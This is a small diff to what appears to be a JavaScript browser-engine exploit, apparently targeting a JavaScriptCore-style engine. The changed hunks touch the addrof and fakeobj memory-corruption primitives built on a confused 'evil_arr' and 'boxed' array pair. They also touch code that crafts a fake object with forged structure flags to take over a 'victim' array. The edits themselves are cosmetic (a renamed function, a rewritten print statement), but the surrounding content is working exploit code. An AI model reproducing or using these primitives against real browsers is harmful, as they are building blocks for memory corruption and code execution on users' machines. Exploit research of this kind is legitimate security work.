@@ -533,7 +533,7 @@ b.process = (inputs, outputs, parameters)=>{
             boxed[0] = obj;
             return floatAsQword(evil_arr[boxed_offset]);
         }
-        var fakeObj = (addr)=>{
+        var fakeobj = (addr)=>{
             evil_arr[boxed_offset] = qwordAsFloat(addr);
             return boxed[0];
         }
@@ -562,7 +562,7 @@ b.process = (inputs, outputs, parameters)=>{
 	      // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     //var victim = structs[0x800];
-    print(`[+] victim @ ${addrof(victim)}`);
+    print("[+] victim @ " + addrof(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = qwordAsTagged(0x0108200700001000);
